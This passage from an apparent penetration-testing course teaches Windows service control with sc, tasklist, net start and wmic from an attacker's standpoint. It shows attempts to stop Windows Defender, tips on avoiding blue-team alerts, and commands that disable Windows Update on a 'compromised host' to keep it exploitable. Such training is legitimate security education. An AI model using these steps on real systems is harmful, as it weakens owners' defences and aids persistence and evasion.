<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599\(v=ws.11\">SC</a>) is a Windows executable utility that allows us to query, modify, and manage host services locally and over the network. For most of this section, we will utilize <code>SC</code> as our defacto way to handle services. We have other tools, like Windows Management Instrumentation (<code>WMIC</code>) and <code>Tasklist</code> that can also query and manage services for local and remote hosts. Let&#39;s dive in and give <code>sc</code> a try.</p>
<p><strong>SC without Parameters</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">sc</span>  

DESCRIPTION:
        <span class="hljs-keyword">SC</span> is a command <span class="hljs-keyword">line</span> <span class="hljs-keyword">program</span> used <span class="hljs-keyword">for</span> communicating with the
        Service Control Manager and services.
USAGE:
        <span class="hljs-keyword">sc</span> &lt;server&gt; [command] [service name] &lt;option1&gt; &lt;option2&gt;...


        The option &lt;server&gt; has the <span class="hljs-keyword">form</span> <span class="hljs-string">"\\ServerName"</span>
        Further <span class="hljs-keyword">help</span> <span class="hljs-keyword">on</span> commands can be obtained <span class="hljs-keyword">by</span> typing: <span class="hljs-string">"sc [command]"</span>
        Commands:
          <span class="hljs-keyword">query</span>-----------Queries the status <span class="hljs-keyword">for</span> a service, or
                          enumerates the status <span class="hljs-keyword">for</span> types of services.
          queryex---------Queries the extended status <span class="hljs-keyword">for</span> a service, or
                          enumerates the status <span class="hljs-keyword">for</span> types of services.
          start-----------Starts a service.
          <span class="hljs-keyword">pause</span>-----------Sends a <span class="hljs-keyword">PAUSE</span> control request to a service.

&lt;SNIP&gt;  

<span class="hljs-keyword">SYNTAX</span> EXAMPLES
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span>                - Enumerates status <span class="hljs-keyword">for</span> active services &amp; drivers
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> eventlog       - Displays status <span class="hljs-keyword">for</span> the eventlog service
<span class="hljs-keyword">sc</span> queryex eventlog     - Displays extended status <span class="hljs-keyword">for</span> the eventlog service
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> <span class="hljs-keyword">type</span>= driver   - Enumerates only active drivers
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> <span class="hljs-keyword">type</span>= service  - Enumerates only Win32 services
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> state= all     - Enumerates all services &amp; drivers
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> bufsize= 50    - Enumerates with a 50 byte buffer
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> ri= 14         - Enumerates with resume index = 14
<span class="hljs-keyword">sc</span> queryex group= <span class="hljs-string">""</span>    - Enumerates active services not <span class="hljs-keyword">in</span> a <span class="hljs-built_in">group</span>
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> <span class="hljs-keyword">type</span>= interact - Enumerates all interactive services
<span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> <span class="hljs-keyword">type</span>= driver group= NDIS     - Enumerates all NDIS drivers
</code></pre>
<p>As we can see, SC without parameters functions like most commands and provides us with the help context and a couple of great examples to get started with printed to the terminal output.</p>
<hr>
<h3 id="query-services">Query Services</h3>
<p>Being able to <code>query</code> services for information such as the <code>process state</code>, <code>process id</code> (<code>pid</code>), and <code>service type</code> is a valuable tool to have in our arsenal as an attacker. We can use this to check if certain services are running or check all existing services and drivers on the system for further information. Before we look specifically into checking the Windows Defender service, let&#39;s see what services are currently actively running on the system. We can do so by issuing the following command: <code>sc query type= service</code>.</p>
<p>Note: The spacing for the optional query parameters is crucial. For example, <code>type= service</code>, <code>type=service</code>, and <code>type =service</code> are completely different ways of spacing this parameter. However, only <code>type= service</code> is correct in this case.</p>
<p><strong>Query All Active Services</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\htb&gt; sc query <span class="hljs-keyword">type</span>= service

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">30</span>  WIN32
        STATE              : 4  <span class="hljs-type">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0<span class="hljs-type">x0</span>)
        SERVICE_EXIT_CODE  : 0  (0<span class="hljs-type">x0</span>)
        CHECKPOINT         : 0<span class="hljs-type">x0</span>
        WAIT_HINT          : 0<span class="hljs-type">x0</span>

SERVICE_NAME: AppXSvc
DISPLAY_NAME: AppX Deployment Service (AppXSVC)
        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">30</span>  WIN32
        STATE              : 4  <span class="hljs-type">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0<span class="hljs-type">x0</span>)
        SERVICE_EXIT_CODE  : 0  (0<span class="hljs-type">x0</span>)
        CHECKPOINT         : 0<span class="hljs-type">x0</span>
        WAIT_HINT          : 0<span class="hljs-type">x0</span>

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">30</span>  WIN32
        STATE              : 4  <span class="hljs-type">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0<span class="hljs-type">x0</span>)
        SERVICE_EXIT_CODE  : 0  (0<span class="hljs-type">x0</span>)
        CHECKPOINT         : 0<span class="hljs-type">x0</span>
        WAIT_HINT          : 0<span class="hljs-type">x0</span>

SERVICE_NAME: Audiosrv
DISPLAY_NAME: Windows Audio
        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        STATE              : 4  <span class="hljs-type">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0<span class="hljs-type">x0</span>)
        SERVICE_EXIT_CODE  : 0  (0<span class="hljs-type">x0</span>)
        CHECKPOINT         : 0<span class="hljs-type">x0</span>
        WAIT_HINT          : 0<span class="hljs-type">x0</span>

SERVICE_NAME: BFE
DISPLAY_NAME: Base Filtering Engine
        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">20</span>  WIN32_SHARE_PROCESS
        STATE              : 4  <span class="hljs-type">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0<span class="hljs-type">x0</span>)
        SERVICE_EXIT_CODE  : 0  (0<span class="hljs-type">x0</span>)
        CHECKPOINT         : 0<span class="hljs-type">x0</span>
        WAIT_HINT          : 0<span class="hljs-type">x0</span>

SERVICE_NAME: BITS
DISPLAY_NAME: Background Intelligent Transfer Service
        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">30</span>  WIN32
        STATE              : 4  <span class="hljs-type">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0<span class="hljs-type">x0</span>)
        SERVICE_EXIT_CODE  : 0  (0<span class="hljs-type">x0</span>)
        CHECKPOINT         : 0<span class="hljs-type">x0</span>
        WAIT_HINT          : 0<span class="hljs-type">x0</span>

&lt;SNIP&gt;
</code></pre>
<p>We can see a complete list of the actively running services on this system. Using this information, we can thoroughly scope out what is running on the system and look for anything that we wish to disable or in some cases, services that we can attempt to take over for our own purposes, whether it be for escalation or persistence.</p>
<p>Returning to our scenario, we recently landed on a host and need to <code>query</code> the host and determine if Windows Defender is active. Let&#39;s give <code>sc query</code> a try.</p>
<p><strong>Querying for Windows Defender</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc query windefend    

<span class="hljs-attribute">SERVICE_NAME</span>: windefend
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">4</span>  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>Now, what do we see above? We can tell that Windows Defender is running and, with our current permission set (the one in which we utilized for the query), does not have permission to stop or pause the service (likely because our user is a standard user and not an administrator). We can test this by trying to stop the service.</p>
<hr>
<h3 id="stopping-and-starting-services">Stopping and Starting Services</h3>
<p><strong>Stopping an Elevated Service</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\htb&gt; sc stop windefend

<span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied.
</code></pre>
<p>As we can see from the output above, our current user doesn&#39;t have the proper permissions to stop or pause this particular service. To perform this action, we would likely need the permissions of an Administrator account, and in some cases, certain services can only be handled by the system itself. Ideally, attempting to stop an elevated service like this is not the best way of testing permissions, as this will likely lead to us getting caught due to the traffic that will be kicked up from running a command like this.</p>
<p>Now that we&#39;ve attempted and failed to stop the <code>windefend</code> service under a user with standard permissions let us showcase what would happen if we did indeed gain access to an account containing local administrator privileges for the machine. We can attempt to stop services via the <code>sc stop &lt;service name&gt;</code> command. Let&#39;s try the previous example once again with elevated permissions as the <code>Administrator</code> user.</p>
<p><strong>Stopping an Elevated Service as Administrator</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\WINDOWS\system32&gt; sc stop windefend

<span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied.
</code></pre>
<p>It seems we still do not have the proper access to stop this service in particular. This is a good lesson for us to learn, as certain processes are protected under stricter access requirements than what local administrator accounts have. In this scenario, the only thing that can stop and start the Defender service is the <a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts">SYSTEM</a> machine account.</p>
<p>As an attacker, learning the restrictions behind what certain accounts have access or lack of access to is very important because blindly trying to stop services will fill the logs with errors and trigger any alerts showing that a user with insufficient privileges is trying to access a protected process on the system. This will catch the blue team&#39;s attention to our activities and begin a triage attempt to kick us off the system and lock us out permanently.</p>
<p><strong>Stopping Services</strong></p>
<p>Moving on, let&#39;s find ourselves a service we can take out as an Administrator. The good news is that we can stop the Print Spooler service. Let&#39;s try to do so.</p>
<p><strong>Finding the Print Spooler Service</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc query Spooler

<span class="hljs-attribute">SERVICE_NAME</span>: Spooler
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">110</span>  WIN32_OWN_PROCESS  (interactive)
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">4</span>  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>As we can see from the output above, the <code>Spooler</code> service is actively running on our current system.</p>
<p><strong>Stopping the Print Spooler Service</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc stop Spooler

<span class="hljs-attribute">SERVICE_NAME</span>: Spooler
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">110</span>  WIN32_OWN_PROCESS  (interactive)
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">3</span>  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x3
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x4e20

<span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc query Spooler

<span class="hljs-attribute">SERVICE_NAME</span>: Spooler
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">110</span>  WIN32_OWN_PROCESS  (interactive)
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">1</span>  STOPPED
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>As stated above, we can issue the command <code>sc stop Spooler</code> to have Windows issue a <code>STOP</code> control request to the service. It is important to note that not all services will respond to these requests, regardless of our permissions, especially if other running programs and services depend on the service we are attempting to stop.</p>
<p><strong>Starting Services</strong></p>
<p>Much like stopping services, we are also able to start services as well. Although stopping services seems to offer a bit more practicality at first to the red team, being able to start services can lend itself to be especially useful in conjunction with being able to modify existing services.</p>
<p>Starting from our previous example, we are still working with the <code>Spooler</code> service that was stopped previously. We can restart this service by issuing the <code>sc start Spooler</code> command. Let&#39;s try it now.</p>
<p><strong>Starting the Print Spooler Service</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc start Spooler

<span class="hljs-attribute">SERVICE_NAME</span>: Spooler
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">110</span>  WIN32_OWN_PROCESS  (interactive)
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">2</span>  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x7d0
        <span class="hljs-attribute">PID                </span>: <span class="hljs-number">34908</span>
        <span class="hljs-attribute">FLAGS              </span>:

<span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc query Spooler

<span class="hljs-attribute">SERVICE_NAME</span>: Spooler
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">110</span>  WIN32_OWN_PROCESS  (interactive)
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">4</span>  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>We can see here that upon issuing a start request to the <code>Spooler</code> service, we can see that it begins in a <code>START_PENDING</code> state and, after another query, is fully up and operational. Typically services will take a few seconds or so to initialize after a request to start is issued.</p>
<hr>
<h3 id="modifying-services">Modifying Services</h3>
<p>In addition to being able to start and stop services, we can also attempt to modify existing services as well. This is where attackers can thrive as we try to modify existing services to serve whatever purpose we need them to. In some cases, we can change them to be disabled at startup or modify the service&#39;s path to the binary itself. Be aware that these examples are only some of the possibilities of the actions we can take. With such a versatile command, we have many options for manipulating services to do whatever we need them to. Let&#39;s go ahead and see if we can modify some services to prevent Windows from updating itself.</p>
<p><strong>Disabling Windows Updates Using SC</strong></p>
<p>To configure services, we must use the <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config">config</a> parameter in <code>sc</code>. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (<code>SCM</code>). Remember that all changes to existing services will only fully update after restarting the service.</p>
<p>Note: It is important to be aware that modifying existing services can effectively take them out permanently as any changes made are recorded and saved in the registry, which can persist on reboot. Please exercise caution when modifying services in this manner.</p>
<p>With all this information out of the way, let&#39;s try to take out Windows Updates for our current compromised host.</p>
<p>Unfortunately, the Windows Update feature (<code>Version 10 and above</code>) does not just rely on one service to perform its functionality. Windows updates rely on the following services:</p>
<table>
<thead>
<tr>
<th>Service</th>
<th>Display Name</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>wuauserv</code></td>
<td>Windows Update Service</td>
</tr>
<tr>
<td><code>bits</code></td>
<td>Background Intelligent Transfer Service</td>
</tr>
</tbody>
</table>
<p>Let&#39;s query all of the required services and see what is currently running and needs to be stopped before making our required changes.</p>
<p><em>Important: The scenario below requires access to a privileged account. Making updates to services will typically require a set of higher permissions than a regular user will have access to.</em></p>
<p><strong>Checking the State of the Required Services</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc query wuauserv

<span class="hljs-attribute">SERVICE_NAME</span>: wuauserv
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">30</span>  WIN32
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">1</span>  STOPPED
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0

<span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc query bits

<span class="hljs-attribute">SERVICE_NAME</span>: bits
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">30</span>  WIN32
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">4</span>  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>From the information provided above, we can see that the <code>wuauserv</code> service is not currently active as the system is not currently in the process of updating. However, the <code>bits</code> service (required to download updates) is currently running on our system. We can issue a stop to this service using our knowledge from the prior section by doing the following:</p>
<p><strong>Stopping BITS</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt; sc stop bits

<span class="hljs-attribute">SERVICE_NAME</span>: bits
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">30</span>  WIN32
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">3</span>  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x1
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>After ensuring that both services are currently stopped, we can modify the <code>start type</code> of both services. We can issue this change by performing the following:</p>
<p><strong>Disabling Windows Update Service</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\WINDOWS\system32&gt; <span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> wuauserv start= <span class="hljs-keyword">disabled
</span>
[<span class="hljs-keyword">SC] </span>ChangeServiceConfig SUCCESS
</code></pre>
<p><strong>Disabling Background Intelligent Transfer Service</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\WINDOWS\system32&gt; <span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> <span class="hljs-keyword">bits </span>start= <span class="hljs-keyword">disabled
</span>
[<span class="hljs-keyword">SC] </span>ChangeServiceConfig SUCCESS
</code></pre>
<p>We can see the confirmation that both services have been modified successfully. This means that when both services attempt to start, they will be unable to as they are currently disabled. As previously mentioned, this change will persist upon reboot, meaning that when the system attempts to check for updates or update itself, it cannot do so because both services will remain disabled. We can verify that both services are indeed disabled by attempting to start them.</p>
<p><strong>Verifying Services are Disabled</strong></p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\WINDOWS\system32&gt; <span class="hljs-keyword">sc </span>start wuauserv 

[<span class="hljs-keyword">SC] </span>StartService FAILED <span class="hljs-number">1058</span>:

The service cannot <span class="hljs-keyword">be </span>started, <span class="hljs-keyword">either </span><span class="hljs-keyword">because </span>it is <span class="hljs-keyword">disabled </span><span class="hljs-keyword">or </span><span class="hljs-keyword">because </span>it has no enabled devices associated with it.

C:\WINDOWS\system32&gt; <span class="hljs-keyword">sc </span>start <span class="hljs-keyword">bits
</span>
[<span class="hljs-keyword">SC] </span>StartService FAILED <span class="hljs-number">1058</span>:

The service cannot <span class="hljs-keyword">be </span>started, <span class="hljs-keyword">either </span><span class="hljs-keyword">because </span>it is <span class="hljs-keyword">disabled </span><span class="hljs-keyword">or </span><span class="hljs-keyword">because </span>it has no enabled devices associated with it.
</code></pre>
<p>Note: To revert everything back to normal, you can set <code>start= auto</code> to make sure that the services can be restarted and function appropriately.</p>
<p>We have verified that both services are now disabled, as we cannot start them manually. Due to the changes made here, Windows cannot utilize its updating feature to provide any system or security updates. This can be very beneficial to an attacker to ensure that a system can remain out of date and not retrieve any updates that would inhibit the usage of certain exploits on a target system. Be aware that by doing this in this manner, we will likely be triggering alerts for this sort of action set up by the resident blue team. This method is not quiet and does require elevated permissions in a lot of cases to perform.</p>
<hr>
<h3 id="other-routes-to-query-services">Other Routes to Query Services</h3>
<p>During the course of this section, we have only focused on using <code>sc</code> to query, start, stop, and modify services. However, we have other choices regarding how to accomplish some of these same tasks using different commands. In this section, we will strictly focus on using some of these other commands to help with our enumeration by being able to query services and display the available information in different ways.</p>
<p><strong>Using Tasklist</strong></p>
<p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist">Tasklist</a> is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the <code>/svc</code> parameter to provide a list of services running under each process on the system. Let&#39;s look at some of the output this can provide.</p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\htb&gt; tasklist /svc


Image Name                     PID Services
========================= ======== ============================================
System Idle Process             <span class="hljs-number"> 0 </span>N/A
System                          <span class="hljs-number"> 4 </span>N/A
Registry                      <span class="hljs-number"> 108 </span>N/A
smss.exe                      <span class="hljs-number"> 412 </span>N/A
csrss.exe                     <span class="hljs-number"> 612 </span>N/A
wininit.exe                   <span class="hljs-number"> 684 </span>N/A
csrss.exe                     <span class="hljs-number"> 708 </span>N/A
services.exe                  <span class="hljs-number"> 768 </span>N/A
lsass.exe                     <span class="hljs-number"> 796 </span>KeyIso, SamSs, VaultSvc
winlogon.exe                  <span class="hljs-number"> 856 </span>N/A
svchost.exe                   <span class="hljs-number"> 984 </span>BrokerInfrastructure, DcomLaunch, PlugPlay,
                                   Power, SystemEventsBroker
fontdrvhost.exe              <span class="hljs-number"> 1012 </span>N/A
fontdrvhost.exe              <span class="hljs-number"> 1020 </span>N/A
svchost.exe                   <span class="hljs-number"> 616 </span>RpcEptMapper, RpcSs
svchost.exe                   <span class="hljs-number"> 996 </span>LSM
dwm.exe                      <span class="hljs-number"> 1068 </span>N/A
svchost.exe                  <span class="hljs-number"> 1236 </span>CoreMessagingRegistrar
svchost.exe                  <span class="hljs-number"> 1244 </span>lmhosts
svchost.exe                  <span class="hljs-number"> 1324 </span>NcbService
svchost.exe                  <span class="hljs-number"> 1332 </span>TimeBrokerSvc
svchost.exe                  <span class="hljs-number"> 1352 </span>Schedule
&lt;SNIP&gt;
</code></pre>
<p>As we can see, we have a full listing of processes that are currently running on the system, their respective <code>PID</code>, and what service(s) are hosted under each process. This can be very helpful in quickly locating what process hosts what service(s).</p>
<p><strong>Using Net Start</strong></p>
<p><a href="https://ss64.com/nt/net-service.html">Net start</a> is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to <code>net start</code>, there is also <code>net stop</code>, <code>net pause</code>, and <code>net continue</code>. These will behave very similarly to <code>sc</code> as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.</p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net start

<span class="hljs-symbol">These</span> Windows services are started:

   Application Information
   AppX Deployment Service (AppXSVC)
   AVCTP service
   <span class="hljs-keyword">Background </span>Tasks Infrastructure Service
   <span class="hljs-keyword">Base </span>Filtering Engine
   <span class="hljs-keyword">BcastDVRUserService_3321a
</span>   Capability Access Manager Service
   cbdhsvc_3321a
   <span class="hljs-keyword">CDPUserSvc_3321a
</span>   Client License Service (ClipSVC)
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   Connected Devices Platform Service
   Connected User Experiences <span class="hljs-keyword">and </span>Telemetry
   CoreMessaging
   Credential Manager
   Cryptographic Services
   <span class="hljs-meta">Data</span> Usage
   DCOM Server Process Launcher
   Delivery Optimization
   Device Association Service
   DHCP Client
   &lt;SNIP&gt;
</code></pre>
<p>From the output above, we can see that using <code>net start</code> without specifying a <code>service</code> will list all of the active services on the system.</p>
<p><strong>Using WMIC</strong></p>
<p>Last but not least, we have <a href="https://ss64.com/nt/wmic.html">WMIC</a>. The Windows Management Instrumentation Command (<code>WMIC</code>) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information. However, we will only be going over a very small subset of the functionality provided by the <code>SERVICE</code> component residing inside this application.</p>
<p>To list all services existing on our system and information on them, we can issue the following command: <code>wmic service list brief</code> .</p>
<p>Managing Services</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wmic service list brief

ExitCode  Name                                      ProcessId  StartMode  State    Status
1077      AJRouter                                 <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
1077      ALG                                      <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
1077      AppIDSvc                                 <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         Appinfo                                  <span class="hljs-number"> 5016 </span>      Manual     Running  OK
1077      AppMgmt                                  <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
1077      AppReadiness                             <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
1077      AppVClient                               <span class="hljs-number"> 0 </span>         Disabled   Stopped  OK
0         AppXSvc                                  <span class="hljs-number"> 9996 </span>      Manual     Running  OK
1077      AssignedAccessManagerSvc                 <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         AudioEndpointBuilder                     <span class="hljs-number"> 2076 </span>      Auto       Running  OK
0         Audiosrv                                 <span class="hljs-number"> 2332 </span>      Auto       Running  OK
1077      autotimesvc                              <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
1077      AxInstSV                                 <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
1077      BDESVC                                   <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         BFE                                      <span class="hljs-number"> 2696 </span>      Auto       Running  OK
0         BITS                                     <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         BrokerInfrastructure                     <span class="hljs-number"> 984 </span>       Auto       Running  OK
1077      BTAGService                              <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         BthAvctpSvc                              <span class="hljs-number"> 4448 </span>      Manual     Running  OK
1077      bthserv                                  <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         camsvc                                   <span class="hljs-number"> 5676 </span>      Manual     Running  OK
0         CDPSvc                                   <span class="hljs-number"> 4724 </span>      Auto       Running  OK
1077      CertPropSvc                              <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         ClipSVC                                  <span class="hljs-number"> 9156 </span>      Manual     Running  OK
1077      cloudidsvc                               <span class="hljs-number"> 0 </span>         Manual     Stopped  OK
0         COMSysApp                                <span class="hljs-number"> 3668 </span>      Manual     Running  OK
0         CoreMessagingRegistrar                   <span class="hljs-number"> 1236 </span>      Auto       Running  OK
0         CryptSvc                                 <span class="hljs-number"> 2844 </span>      Auto       Running  OK
